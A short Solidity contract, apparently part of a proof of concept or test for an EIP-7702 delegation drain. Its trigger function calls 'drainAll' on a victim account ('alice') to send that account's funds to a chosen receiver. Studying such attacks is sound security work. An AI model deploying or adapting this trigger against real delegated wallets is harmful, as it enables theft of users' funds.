// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Alice7702DrainTrigger {
    event Triggered(address indexed caller, address indexed alice, address indexed receiver);

    function trigger(address alice, address payable receiver) external {
        (bool ok,) = alice.call(abi.encodeWithSignature("drainAll(address)", receiver));
        require(ok, "alice drain call failed");

        emit Triggered(msg.sender, alice, receiver);
    }
}
